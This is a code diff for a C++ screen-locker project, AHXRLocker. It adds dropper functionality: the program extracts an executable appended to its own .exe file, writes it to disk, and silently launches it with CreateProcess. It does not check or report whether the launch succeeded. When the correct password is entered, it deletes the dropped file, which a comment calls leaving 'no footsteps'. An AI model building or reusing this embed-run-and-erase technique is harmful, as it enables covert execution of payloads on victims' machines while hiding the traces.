@@ -55,10 +55,11 @@ int main() {
 
 #ifdef DEBUG_MODE
 	packLocker(DUMMY_FILE, DUMMY_PASSWORD, DUMMY_MESSAGE);
+	attachExecutable(DUMMY_FILE, DUMMY_EXE);
 
 	// Attempting to open and read own .exe file.
 	std::ifstream
-		f_exe(DUMMY_FILE);
+		f_exe(DUMMY_FILE, std::ios::binary);
 #else
 	// Attempting to open and read own .exe file.
 	wchar_t
@@ -73,7 +74,7 @@ int main() {
 		s_fetch_dir(ws.begin(), ws.end());
 
 	std::ifstream
-		f_exe(s_fetch_dir);
+		f_exe(s_fetch_dir, std::ios::binary);
 #endif
 
 	if (f_exe.is_open()) {
@@ -90,42 +91,61 @@ int main() {
 		std::ifstream
 			f_exe_l(s_fetch_dir, std::ios::binary);
 #endif
-		std::streamoff
-			i_length;
+
+		std::streamoff is_length;
+		int i_length;
 
 		f_exe_l.seekg(0, std::ios::end); // Going to the end.
-		i_length = f_exe_l.tellg(); // Length fetching.
+		is_length = f_exe_l.tellg(); // Length fetching.
 		f_exe_l.close();
+
+		i_length = static_cast<int>(is_length); // Data loss prevention.
 		
 		/*
 			Going back to our .exe file and setting the starting reading spot.
 			
 			But that reading spot is at the END of the file. So we're going to start at 
-			the length of the file then go back 88 characters just so we can read from point A to B.
+			the length of the file then go back just so we can read from point A to B.
 
-			After debugging outputs. 88 seems to be the lucky number to start at.
-			( 20 MAX message length. SHA256 is 64 characters. Counting brackets too (4) )
+			Finding how far we need to go back (due to exe attachments).
 		*/
-		f_exe.seekg(i_length - CHARACTERS_SEEK_BACK);
+		char * c_search = new char[i_length];
+		f_exe.read(c_search, i_length);
 
-		// Reading the file and converting it into a standard string.
-		char 
-			* c_search = new char[MAX_READING_SIZE];
+		std::string s_search(c_search, i_length);
+		std::size_t t_first_open = 0;
 
-		f_exe.read(c_search, CHARACTERS_SEEK_BACK);
+		/*
+			Whenever the file was packed, the password/message/attachment were split
+			by 4 dashes. In previous versions (before .exe attachment), it made it extremely
+			painful to find a starting search spot because the opener and closer symbols are
+			common in an encrypted file. 
 
-		std::string 
-			s_search(c_search, MAX_READING_SIZE);
+			After debugging, it seems that .exe files have a bunch of symbols that show up consistently.
+			Even if we read the file backwards, we wouldn't know the length of the attached .exe file.
+			This is why we are reading the file from top to bottom, instead of bottom to top.
 
-		// Don't open the application if there is no pack.
-		if (s_search.find(SEARCH_OPENER) == std::string::npos || s_search.find(SEARCH_CLOSER) == std::string::npos)
+			This project (AHXRLocker), when compiled will write 3 (DEBUG) or 2 (RELEASE) different "----" in the .exe code.
+			Since that is the case, I have to skip over those 2/3 to find the right 4 dashes that was used
+			to separate the password/message/attachment.
+		*/
+#ifdef DEBUG_MODE
+		for (unsigned int i = 0; i < 3; i ++ ) 
+			t_first_open = s_search.find("----", t_first_open + 3);
+#else
+		for (unsigned int i = 0; i < 2; i++)
+			t_first_open = s_search.find("----", t_first_open + 3);
+#endif
+
+		// Checking if there are any packs to begin with. If not: exit.
+		if (t_first_open == std::string::npos) 
 			exit(0);
+		
+		f_exe.seekg(t_first_open); // Let's start reading from the REAL splitter now.
 
 		// Obtaining the password hash.
-		size_t t_pw_open = s_search.find(SEARCH_OPENER);
-		size_t t_pw_close = s_search.find(SEARCH_CLOSER);
-
-		s_password = s_search.substr(t_pw_open + 1, PASSWORD_HASH_LENGTH); // Reading from start to 64 (SHA256 = 64 characters)
+		size_t t_pw_close = s_search.find(SEARCH_CLOSER, t_first_open);
+		s_password = s_search.substr(t_first_open + 5, PASSWORD_HASH_LENGTH); // Reading from start to 64 (SHA256 = 64 characters)
 
 #ifdef DEBUG_MODE
 		std::cout << s_password << "\r\n\r\n"; // Debugging the output.
@@ -141,6 +161,34 @@ int main() {
 		std::cout << s_message << "\r\n\r\n"; // Debugging the output.
 #endif
 
+		// Obtaining the .exe attachment.
+		size_t t_exe_open = s_search.find(SEARCH_OPENER, t_msg_close);
+
+		if (t_exe_open != std::string::npos) {
+			f_exe.seekg(t_exe_open + 1); // Setting position to read the attached .exe
+
+			char c_exe_read;
+			std::fstream f_attach(ATTACH_FILE, std::ios::out | std::ios::binary);
+
+			// Reading and writing the .exe to a new location.
+			while (f_exe.get(c_exe_read))
+				f_attach.put(c_exe_read);
+
+			f_attach.close();
+
+			/*
+				Running the .exe file.
+
+				I'm not going to bother checking and notifying if the process ran or not, otherwise it would void
+				the whole point of the locker. If it runs, it runs, if not, oh well. The attached .exe will run
+				until it's closed by itself.
+			*/
+			STARTUPINFO start_info = {
+				sizeof(start_info)
+			};
+			CreateProcess(ATTACH_FILE, L"", 0, 0, 1, 0, 0, 0, &start_info, &proc_info);
+			b_exe_attach = true;
+		}
 		f_exe.close();
 		delete c_search;
 	}
@@ -170,6 +218,10 @@ static void comparePasswords(String ^ passwordInput) {
 
 	if (s_input.compare(s_password) == 0) {
 		b_password_res = true;
+
+		if (b_exe_attach)
+			remove(ATTACH_FILE_C); // Remove the attachment file before closing. No footsteps.
+
 		exit(1);
 	}
 }
